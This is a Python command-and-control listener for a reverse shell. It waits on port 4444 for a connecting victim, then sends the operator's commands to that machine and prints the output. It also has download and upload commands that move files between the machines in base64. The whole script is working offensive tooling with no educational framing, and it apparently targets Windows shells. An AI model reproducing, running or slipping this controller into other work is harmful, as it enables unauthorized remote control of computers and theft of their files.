#!/usr/bin/python3
import socket, base64
from execmd_list import execmd_lst

server_ip = '0.0.0.0'  # Example server IP
server_port = 4444  # Example server port
data_size = 1024  # Example data size

def main():
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	server.bind((server_ip, server_port))
	server.listen(5)
	print("Listening ... ")
	client_socket, client_ip = server.accept()

	msg = "Connection was Successfully!"
	print(msg)
	print("Connected to " + client_ip[0])

	while True:

		cmd = input("[*]>>> : ")
		cmd0 = cmd.split(' ')[0]

		client_socket.send(cmd.encode())

		if cmd.lower() in [0, 'q', 'x', 'exit', 'quit', '']:
			print("Disconnecting ...")
			break
		else:
			if cmd == '' or cmd in ['powershell', 'cmd']:
				print("Reconnecting ...")
				main()
			elif cmd0 in execmd_lst:
				continue
			elif cmd[:8] == 'download':
				with open(cmd[9:], 'wb') as file_:
					file = client_socket.recv(data_size)
					file_decoded = base64.b64decode(file)
					file_.write(file_decoded)
					print("File downloaded successfully!!!")
					continue
			elif cmd[:6] == 'upload':
				try:
					with open(cmd[7:], 'rb') as file_:
						print("Uploading ...")
						file = base64.b64encode(file_.read())
						client_socket.send(file)
						print("File uploaded successfully!!!")
						continue
				except:
					print("Uploading was unsuccessful!!!")
					continue
		result = client_socket.recv(data_size).decode()
		print(result)

if __name__ == "__main__":
	main()
